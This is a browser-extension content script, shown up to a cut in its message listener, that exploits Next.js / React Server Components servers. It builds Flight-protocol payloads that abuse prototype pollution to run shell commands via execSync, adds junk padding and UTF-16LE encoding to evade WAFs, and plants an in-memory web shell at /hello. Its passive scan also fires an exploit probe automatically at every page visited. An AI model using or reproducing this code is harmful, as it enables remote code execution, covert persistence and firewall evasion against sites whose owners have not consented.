function detectNextJsVersion() {
    let version = null;
    let detectionMethod = null;
    
    try {
        if (typeof window !== 'undefined' && window.__NEXT_DATA__) {
            const nextData = window.__NEXT_DATA__;
            
            if (nextData.nextVersion) {
                version = nextData.nextVersion;
                detectionMethod = '__NEXT_DATA__.nextVersion';
            }
            
            if (!version) {
                try {
                    const nextDataStr = JSON.stringify(nextData);
                    const patterns = [
                        /"nextVersion":\s*"(\d+\.\d+\.\d+)"/i,
                        /next[\/\s@]+(\d+\.\d+\.\d+)/i,
                        /"next":\s*"(\d+\.\d+\.\d+)"/i,
                        /next\.js[\/\s]+(\d+\.\d+\.\d+)/i
                    ];
                    
                    for (const pattern of patterns) {
                        const match = nextDataStr.match(pattern);
                        if (match) {
                            version = match[1];
                            detectionMethod = '__NEXT_DATA__ (stringified)';
                            break;
                        }
                    }
                } catch (e) {
                    console.log('[Next.js Detection] Error stringifying __NEXT_DATA__:', e);
                }
            }
        }
    } catch (e) {
        console.log('[Next.js Detection] Error reading __NEXT_DATA__:', e);
    }
    
    if (!version) {
        try {
            const scripts = document.querySelectorAll('script');
            for (const script of scripts) {
                const src = script.getAttribute('src') || '';
                if (src) {
                    const versionMatch = src.match(/\/_next\/static\/(\d+\.\d+\.\d+)\//);
                    if (versionMatch) {
                        version = versionMatch[1];
                        detectionMethod = 'script_src';
                        break;
                    }
                }
                
                if (!version && script.textContent) {
                    const patterns = [
                        /next[\/\s@]+(\d+\.\d+\.\d+)/i,
                        /"next":\s*"(\d+\.\d+\.\d+)"/i,
                        /next\.js[\/\s]+(\d+\.\d+\.\d+)/i
                    ];
                    
                    for (const pattern of patterns) {
                        const match = script.textContent.match(pattern);
                        if (match) {
                            version = match[1];
                            detectionMethod = 'inline_script';
                            break;
                        }
                    }
                    if (version) break;
                }
            }
        } catch (e) {
            console.log('[Next.js Detection] Error checking script tags:', e);
        }
    }
    
    if (!version) {
        try {
            const metaTags = document.querySelectorAll('meta[name="generator"], meta[property="generator"]');
            for (const meta of metaTags) {
                const content = meta.getAttribute('content') || '';
                const versionMatch = content.match(/Next\.js[\/\s]+(\d+\.\d+\.\d+)/i);
                if (versionMatch) {
                    version = versionMatch[1];
                    detectionMethod = 'meta_generator';
                    break;
                }
            }
        } catch (e) {
            console.log('[Next.js Detection] Error checking meta tags:', e);
        }
    }
    
    if (!version) {
        try {
            const html = document.documentElement.outerHTML;
            const patterns = [
                /Next\.js[\/\s]+(\d+\.\d+\.\d+)/i,
                /next@(\d+\.\d+\.\d+)/i,
                /"next":\s*"(\d+\.\d+\.\d+)"/i,
                /'next':\s*'(\d+\.\d+\.\d+)'/i,
                /next[\/\s]+(\d+\.\d+\.\d+)/i
            ];
            
            for (const pattern of patterns) {
                const match = html.match(pattern);
                if (match) {
                    version = match[1];
                    detectionMethod = 'html_content';
                    break;
                }
            }
        } catch (e) {
            console.log('[Next.js Detection] Error checking HTML content:', e);
        }
    }
    
    if (!version) {
        try {
            if (typeof window !== 'undefined') {
                const windowStr = JSON.stringify(Object.keys(window).filter(k => k.includes('next') || k.includes('Next')));
                const versionMatch = windowStr.match(/next[\/\s@]+(\d+\.\d+\.\d+)/i);
                if (versionMatch) {
                    version = versionMatch[1];
                    detectionMethod = 'window_object';
                }
            }
        } catch (e) {
            console.log('[Next.js Detection] Error checking window object:', e);
        }
    }
    
    if (version) {
        console.log('[Next.js Detection] Version found:', version, 'via', detectionMethod);
    } else {
        console.log('[Next.js Detection] Version not found. __NEXT_DATA__ exists:', typeof window !== 'undefined' && !!window.__NEXT_DATA__);
    }
    
    return { version, detectionMethod };
}

async function performPreAnalysis() {
    try {
        const testCmd = "echo 11111";
        const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
        
        const prefixPayload = `var res=process.mainModule.require('child_process').execSync('${testCmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`;
        
        const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
        
        const wafBypassSizeKb = 128;
        const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
        
        const parts = [];
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
            `${junk}\r\n`
        );
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="0"\r\n\r\n` +
            `${part0}\r\n`
        );
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="1"\r\n\r\n` +
            `"$@0"\r\n`
        );
        
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="2"\r\n\r\n` +
            `[]\r\n`
        );
        
        parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
        
        const bodyParts = parts.join('');
        
        let targetUrl = new URL("/adfa", window.location.href).href;
        
        console.log('[Pre-Analysis] Sending vulnerability check request to:', targetUrl);
        
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                xhr.send(bodyParts);
            });
        };
        
        let res = await makeRequest(targetUrl);
        
        const xActionRedirect1 = res.getResponseHeader('X-Action-Redirect') || res.getResponseHeader('x-action-redirect');
        console.log('[Pre-Analysis] First response X-Action-Redirect:', xActionRedirect1);
        
        if (xActionRedirect1 && (xActionRedirect1.includes('/login?a=') || xActionRedirect1.match(/\/login\?a=[^;]+/))) {
            return {
                vulnerable: true,
                status: res.status,
                xActionRedirect: xActionRedirect1,
                message: 'VULNERABLE'
            };
        }
        
        if (res.status >= 300 && res.status < 400) {
            const locationHeader = res.getResponseHeader('Location') || res.getResponseHeader('location');
            if (locationHeader) {
                console.log('[Pre-Analysis] Location header:', locationHeader);
                
                const redirectUrl = new URL(locationHeader, targetUrl).href;
                console.log('[Pre-Analysis] Following redirect to:', redirectUrl);
                
                try {
                    const redirectRes = await makeRequest(redirectUrl);
                    console.log('[Pre-Analysis] Redirect response status:', redirectRes.status);
                    
                    const xActionRedirect2 = redirectRes.getResponseHeader('X-Action-Redirect') || redirectRes.getResponseHeader('x-action-redirect');
                    console.log('[Pre-Analysis] Redirect response X-Action-Redirect:', xActionRedirect2);
                    
                    if (xActionRedirect2 && (xActionRedirect2.includes('/login?a=') || xActionRedirect2.match(/\/login\?a=[^;]+/))) {
                        return {
                            vulnerable: true,
                            status: redirectRes.status,
                            location: locationHeader,
                            xActionRedirect: xActionRedirect2,
                            message: 'VULNERABLE'
                        };
                    }
                } catch (redirectError) {
                    console.log('[Pre-Analysis] Error following redirect:', redirectError);
                }
            }
        }
        
        const responseText = res.responseText || '';
        if (responseText.includes('/login?a=') || responseText.match(/\/login\?a=[^;]+/)) {
            return {
                vulnerable: true,
                status: res.status,
                location: 'Found in response body',
                message: 'VULNERABLE'
            };
        }
        
        return {
            vulnerable: false,
            status: res.status,
            message: 'NOT VULNERABLE'
        };
        
    } catch (e) {
        console.log('[Pre-Analysis] Error:', e);
        return {
            vulnerable: false,
            error: e.message,
            message: 'NOT VULNERABLE (Error)'
        };
    }
}

async function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    
    const versionInfo = detectNextJsVersion();
    if (versionInfo.version) {
        details.push(`Next.js Version: ${versionInfo.version} (${versionInfo.detectionMethod})`);
    } else {
        details.push("Next.js Version: Not detected");
    }
    
    let preAnalysisResult = null;
    try {
        console.log('[Passive Scan] Starting pre-analysis...');
        preAnalysisResult = await performPreAnalysis();
        console.log('[Passive Scan] Pre-analysis result:', preAnalysisResult);
    } catch (e) {
        console.log('[Passive Scan] Pre-analysis error:', e);
        preAnalysisResult = { vulnerable: false, message: 'NOT VULNERABLE (Error)', error: e.message };
    }
    
    return { 
        isRSC: score >= 50, 
        details: details,
        nextJsVersion: versionInfo.version,
        versionDetectionMethod: versionInfo.detectionMethod,
        preAnalysis: preAnalysisResult
    };
}

async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });
        
        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

function generateJunkData(sizeBytes) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let paramName = '';
    let junk = '';
    
    for (let i = 0; i < 12; i++) {
        paramName += 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)];
    }
    
    for (let i = 0; i < sizeBytes; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    
    return { paramName, junk };
}

function encodeToUtf16LE(str) {
    const utf16leBytes = [];
    for (let i = 0; i < str.length; i++) {
        const code = str.charCodeAt(i);
        utf16leBytes.push(code & 0xFF);
        utf16leBytes.push((code >> 8) & 0xFF);
    }
    return new Uint8Array(utf16leBytes);
}

function stringToUtf16LEBuffer(str) {
    const bytes = encodeToUtf16LE(str);
    return bytes.buffer;
}

async function deployMemoryShell(wafEnabled, awsWafEnabled) {
    try {
        const currentPath = window.location.pathname || '/en';
        const targetUrl = new URL(currentPath, window.location.href).href;
        
        const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
        
        const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
        const shouldUseUtf16LE = awsWafEnabled === true && typeof awsWafEnabled === 'boolean';
        console.log('[Memory Shell] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
        console.log('[Memory Shell] Received awsWafEnabled:', awsWafEnabled, 'Type:', typeof awsWafEnabled);
        console.log('[Memory Shell] Will add junk data:', shouldAddJunkData);
        console.log('[Memory Shell] Will use UTF-16LE:', shouldUseUtf16LE);
        
        const memoryShellCode = `(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/hello'){const cmd=p.query.cmd||'';let html='<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WebShell</title><style>body{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px;max-width:1200px;margin:0 auto;}h1{color:#4ec9b0;border-bottom:2px solid #4ec9b0;padding-bottom:10px;}form{margin:20px 0;background:#252526;padding:15px;border-radius:5px;}input[type="text"]{width:70%;padding:8px;background:#3c3c3c;border:1px solid #555;color:#d4d4d4;font-size:14px;}input[type="submit"]{width:25%;padding:8px;background:#0e639c;border:none;color:#fff;cursor:pointer;font-size:14px;margin-left:10px;}input[type="submit"]:hover{background:#1177bb;}pre{background:#252526;padding:15px;border-radius:5px;overflow-x:auto;border:1px solid #555;white-space:pre-wrap;word-wrap:break-word;}a{color:#4ec9b0;text-decoration:none;}a:hover{text-decoration:underline;}.info{background:#252526;padding:10px;border-radius:5px;margin-top:20px;font-size:12px;color:#858585;border-left:3px solid #4ec9b0;}code{color:#4ec9b0;background:#1e1e1e;padding:2px 6px;border-radius:3px;}</style></head><body><h1>WebShell</h1><form method="GET" action="/hello"><input type="text" name="cmd" value="'+(cmd?cmd.replace(/"/g,'&quot;').replace(/'/g,'&#39;'):'')+'" placeholder="Enter command (e.g., ls -la, cd /home && ls)"><input type="submit" value="Execute"></form>';let currentDir='';if(cmd){try{const result=cp.execSync(cmd,{encoding:'utf8',stdio:'pipe',shell:true});html+='<h2>Output:</h2><pre>'+result.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}catch(err){html+='<h2>Error:</h2><pre style="color:#f48771;">'+err.message.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')+'</pre>';}try{currentDir=cp.execSync('pwd',{encoding:'utf8',stdio:'pipe',shell:true}).trim();}catch(e){currentDir=process.cwd();}}else{currentDir=process.cwd();}html+='<div class="info"><a href="/hello">Clear</a> | <strong>Current Directory:</strong> <code>'+currentDir.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</code></div></body></html>';s.writeHead(200,{'Content-Type':'text/html;charset=utf-8'});s.end(html);return true;}}return o.apply(this,arguments);};})();`;
        
        const memoryShellBase64 = btoa(unescape(encodeURIComponent(memoryShellCode)));
        
        const prefixPayload = `var shellCode=Buffer.from('${memoryShellBase64}','base64').toString('utf8');eval(shellCode);var res='Memory shell deployed at /hello';throw Object.assign(new Error('x'),{digest: Buffer.from(res).toString('base64')});`;
        
        const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
        
        let bodyParts;
        
        if (shouldUseUtf16LE) {
            const part0Headers = (
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="0"\r\n` +
                `Content-Type: text/plain; charset=utf-16le\r\n\r\n`
            );
            const part0HeadersBytes = new TextEncoder().encode(part0Headers);
            
            const part0ContentBytes = encodeToUtf16LE(part0);
            
            const part1 = (
                `\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="1"\r\n\r\n` +
                `"$@0"\r\n`
            );
            const part1Bytes = new TextEncoder().encode(part1);
            
            const part2 = (
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="2"\r\n\r\n` +
                `[]\r\n` +
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n`
            );
            const part2Bytes = new TextEncoder().encode(part2);
            
            let bodyBytes;
            if (shouldAddJunkData) {
                const wafBypassSizeKb = 128;
                const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
                const junkPart = (
                    `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                    `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
                    `${junk}\r\n`
                );
                const junkPartBytes = new TextEncoder().encode(junkPart);
                
                const totalLength = junkPartBytes.length + part0HeadersBytes.length + part0ContentBytes.length + part1Bytes.length + part2Bytes.length;
                bodyBytes = new Uint8Array(totalLength);
                let offset = 0;
                bodyBytes.set(junkPartBytes, offset);
                offset += junkPartBytes.length;
                bodyBytes.set(part0HeadersBytes, offset);
                offset += part0HeadersBytes.length;
                bodyBytes.set(part0ContentBytes, offset);
                offset += part0ContentBytes.length;
                bodyBytes.set(part1Bytes, offset);
                offset += part1Bytes.length;
                bodyBytes.set(part2Bytes, offset);
            } else {
                const totalLength = part0HeadersBytes.length + part0ContentBytes.length + part1Bytes.length + part2Bytes.length;
                bodyBytes = new Uint8Array(totalLength);
                let offset = 0;
                bodyBytes.set(part0HeadersBytes, offset);
                offset += part0HeadersBytes.length;
                bodyBytes.set(part0ContentBytes, offset);
                offset += part0ContentBytes.length;
                bodyBytes.set(part1Bytes, offset);
                offset += part1Bytes.length;
                bodyBytes.set(part2Bytes, offset);
            }
            
            bodyParts = bodyBytes.buffer;
        } else {
            const parts = [];
            
            if (shouldAddJunkData) {
                const wafBypassSizeKb = 128;
                const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
                parts.push(
                    `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                    `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
                    `${junk}\r\n`
                );
            }
            
            parts.push(
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="0"\r\n\r\n` +
                `${part0}\r\n`
            );
            
            parts.push(
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="1"\r\n\r\n` +
                `"$@0"\r\n`
            );
            
            parts.push(
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="2"\r\n\r\n` +
                `[]\r\n`
            );
            
            parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
            
            bodyParts = parts.join('');
        }
        
        console.log('[Content] Deploying memory shell to:', targetUrl);
        
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                
                xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                if (shouldUseUtf16LE) {
                    xhr.send(bodyParts);
                } else {
                    xhr.send(bodyParts);
                }
            });
        };
        
        let res = await makeRequest(targetUrl);
        const statusCode = res.status;
        const responseText = res.responseText || '';
        
        console.log('[Content] Memory shell response status:', statusCode);
        console.log('[Content] Memory shell response text length:', responseText.length);
        console.log('[Content] Memory shell response text:', responseText);
        
        let digestMatch = responseText.match(/"digest"\s*:\s*"([^"]+)"/);
        if (!digestMatch) {
            digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
        }
        
        if (digestMatch && digestMatch[1]) {
            try {
                let rawBase64 = digestMatch[1];
                console.log('[Content] Raw digest base64:', rawBase64);
                
                let cleanBase64 = rawBase64;
                try {
                    cleanBase64 = JSON.parse(`"${rawBase64}"`);
                } catch (e) {
                    cleanBase64 = rawBase64;
                }
                
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );
                
                console.log('[Content] Memory shell deployment response (decoded):', decodedStr);
                
                const shellPath = '/hello';
                const shellUrl = new URL(shellPath, window.location.origin).href;
                
                return {
                    success: true,
                    shellPath: shellPath,
                    fullUrl: shellUrl,
                    statusCode: statusCode,
                    message: decodedStr
                };
            } catch (parseError) {
                console.log('[Content] Failed to parse digest:', parseError);
                console.log('[Content] Error details:', parseError.message);
                console.log('[Content] Raw digest value:', digestMatch[1]);
            }
        } else {
            console.log('[Content] No digest found in response');
        }
        
        if (statusCode >= 200 && statusCode < 300) {
            const shellPath = '/hello';
            const shellUrl = new URL(shellPath, window.location.origin).href;
            
            return {
                success: true,
                shellPath: shellPath,
                fullUrl: shellUrl,
                statusCode: statusCode
            };
        } else if (statusCode === 500) {
            const shellPath = '/hello';
            const shellUrl = new URL(shellPath, window.location.origin).href;
            
            return {
                success: true,
                shellPath: shellPath,
                fullUrl: shellUrl,
                statusCode: statusCode,
                note: 'Deployed (500 error may indicate payload execution)'
            };
        } else {
            return {
                success: false,
                msg: `Memory shell deployment failed. Status: ${statusCode}. Response: ${responseText.substring(0, 200)}`,
                statusCode: statusCode
            };
        }
        
    } catch (e) {
        console.log('[Content] Memory shell deployment error:', e);
        return {
            success: false,
            msg: "Network/Request Error: " + e.message
        };
    }
}

async function performExploit(cmd, wafEnabled, awsWafEnabled) {
    const targetCmd = cmd || "echo vulnerability_test";
    
    const shouldAddJunkData = wafEnabled === true && typeof wafEnabled === 'boolean';
    const shouldUseUtf16LE = awsWafEnabled === true && typeof awsWafEnabled === 'boolean';
    console.log('[RSC Exploit] Received wafEnabled:', wafEnabled, 'Type:', typeof wafEnabled);
    console.log('[RSC Exploit] Received awsWafEnabled:', awsWafEnabled, 'Type:', typeof awsWafEnabled);
    console.log('[RSC Exploit] Will add junk data:', shouldAddJunkData);
    console.log('[RSC Exploit] Will use UTF-16LE:', shouldUseUtf16LE);
    
    const prefixPayload = `var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});`;
    
    const part0 = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
    
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
    
    let bodyParts;
    
    if (shouldUseUtf16LE) {
        const part0Headers = (
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="0"\r\n` +
            `Content-Type: text/plain; charset=utf-16le\r\n\r\n`
        );
        const part0HeadersBytes = new TextEncoder().encode(part0Headers);
        
        const part0ContentBytes = encodeToUtf16LE(part0);
        
        const part1 = (
            `\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="1"\r\n\r\n` +
            `"$@0"\r\n`
        );
        const part1Bytes = new TextEncoder().encode(part1);
        
        const part2 = (
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="2"\r\n\r\n` +
            `[]\r\n` +
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n`
        );
        const part2Bytes = new TextEncoder().encode(part2);
        
        let bodyBytes;
        if (shouldAddJunkData) {
            const wafBypassSizeKb = 128;
            const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
            const junkPart = (
                `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
                `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
                `${junk}\r\n`
            );
            const junkPartBytes = new TextEncoder().encode(junkPart);
            
            const totalLength = junkPartBytes.length + part0HeadersBytes.length + part0ContentBytes.length + part1Bytes.length + part2Bytes.length;
            bodyBytes = new Uint8Array(totalLength);
            let offset = 0;
            bodyBytes.set(junkPartBytes, offset);
            offset += junkPartBytes.length;
            bodyBytes.set(part0HeadersBytes, offset);
            offset += part0HeadersBytes.length;
            bodyBytes.set(part0ContentBytes, offset);
            offset += part0ContentBytes.length;
            bodyBytes.set(part1Bytes, offset);
            offset += part1Bytes.length;
            bodyBytes.set(part2Bytes, offset);
        } else {
            const totalLength = part0HeadersBytes.length + part0ContentBytes.length + part1Bytes.length + part2Bytes.length;
            bodyBytes = new Uint8Array(totalLength);
            let offset = 0;
            bodyBytes.set(part0HeadersBytes, offset);
            offset += part0HeadersBytes.length;
            bodyBytes.set(part0ContentBytes, offset);
            offset += part0ContentBytes.length;
            bodyBytes.set(part1Bytes, offset);
            offset += part1Bytes.length;
            bodyBytes.set(part2Bytes, offset);
        }
        
        bodyParts = bodyBytes.buffer;
    } else {
    const parts = [];
    
    if (shouldAddJunkData) {
        const wafBypassSizeKb = 128;
        const { paramName, junk } = generateJunkData(wafBypassSizeKb * 1024);
        parts.push(
            `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
            `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
            `${junk}\r\n`
        );
    }
    
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="0"\r\n\r\n` +
        `${part0}\r\n`
    );
    
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="1"\r\n\r\n` +
        `"$@0"\r\n`
    );
    
    parts.push(
        `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
        `Content-Disposition: form-data; name="2"\r\n\r\n` +
        `[]\r\n`
    );
    
    parts.push(`------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`);
    
        bodyParts = parts.join('');
    }

    let targetUrl = new URL("/adfa", window.location.href).href;

    lastRequestData = {
        url: targetUrl,
        boundary: boundary,
        body: bodyParts,
        bodyLength: typeof bodyParts === 'string' ? bodyParts.length : bodyParts.byteLength
    };

    let statusCode = null;
    let pageTitle = '-';
    let responseText = '';
    
    try {
        console.log('[Content] Sending exploit request to:', targetUrl);
        
        const makeRequest = (url) => {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                
                xhr.setRequestHeader('Accept', '*/*');
                xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                
                xhr.setRequestHeader('Next-Action', 'x');
                xhr.setRequestHeader('X-Nextjs-Request-Id', 'b5dce965');
                xhr.setRequestHeader('X-Nextjs-Html-Request-Id', 'SSTMXm7OJ_g0Ncx6jpQt9');
                
                if (shouldUseUtf16LE) {
                    xhr.setRequestHeader('Content-Type', 'text/plain; charset=utf-16le');
                } else {
                    xhr.setRequestHeader('Content-Type', `multipart/form-data; boundary=${boundary}`);
                }
                
                xhr.onload = () => {
                    resolve({
                        status: xhr.status,
                        statusText: xhr.statusText,
                        responseText: xhr.responseText,
                        getAllResponseHeaders: () => xhr.getAllResponseHeaders(),
                        getResponseHeader: (name) => xhr.getResponseHeader(name)
                    });
                };
                
                xhr.onerror = () => {
                    reject(new Error('Network request failed'));
                };
                
                if (shouldUseUtf16LE) {
                    xhr.send(bodyParts);
                } else {
                xhr.send(bodyParts);
                }
            });
        };
        
        let res = await makeRequest(targetUrl);
        statusCode = res.status;
        console.log('[Content] Initial response status:', statusCode);
        
        if (statusCode >= 300 && statusCode < 400) {
            const locationHeader = res.getResponseHeader('Location') || res.getResponseHeader('location');
            if (locationHeader) {
                const redirectUrl = new URL(locationHeader, targetUrl).href;
                console.log('[Content] Redirect detected to:', redirectUrl);
                
                targetUrl = redirectUrl;
                lastRequestData.url = targetUrl;
                res = await makeRequest(targetUrl);
                statusCode = res.status;
                console.log('[Content] Retry on redirect URL, new status:', statusCode);
            }
        }
        
        responseText = res.responseText || '';
        console.log('[Content] Response text length:', responseText.length);
        
        try {
            if (responseText) {
                const titleMatch = responseText.match(/<title[^>]*>([^<]+)<\/title>/i);
                if (titleMatch && titleMatch[1]) {
                    pageTitle = titleMatch[1].trim();
                }
            }
            if (pageTitle === '-' && typeof document !== 'undefined' && document.title) {
                pageTitle = document.title;
            }
        } catch (e) {
            console.log('[Content] Title extraction error:', e);
        }
        
        console.log('[Content] Extracted title:', pageTitle);

        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];
            
            try {
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                
                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                const result = { 
                    success: true, 
                    output: decodedStr,
                    statusCode: statusCode,
                    title: pageTitle,
                    requestData: lastRequestData
                };
                console.log('[Content] Returning success result:', result);
                return result;
            } catch (parseError) {
                return { 
                    success: false, 
                    msg: "Decoding Error: " + parseError.message, 
                    debug: rawBase64,
                    statusCode: statusCode,
                    title: pageTitle,
                    requestData: lastRequestData
                };
            }
        } else {
            return { 
                success: false, 
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText ? responseText.substring(0, 100) : 'No response text',
                statusCode: statusCode,
                title: pageTitle,
                requestData: lastRequestData
            };
        }

    } catch (e) {
        console.log('[Content] Fetch error:', e);
        return { 
            success: false, 
            msg: "Network/Request Error: " + e.message,
            statusCode: statusCode || null,
            title: pageTitle || '-',
            requestData: lastRequestData
        };
    }
}

const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

let lastRequestData = null;

let passiveDataPromise = performPassiveScan();
passiveDataPromise.then(passiveData => {
if(passiveData.isRSC) browserAPI.runtime.sendMessage({ action: "update_badge" });
});

browserAPI.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") {
        passiveDataPromise.then(passiveData => {
            sendResponse(passiveData);
        });
        return true;
    }
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        console.log('[Content] Received message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
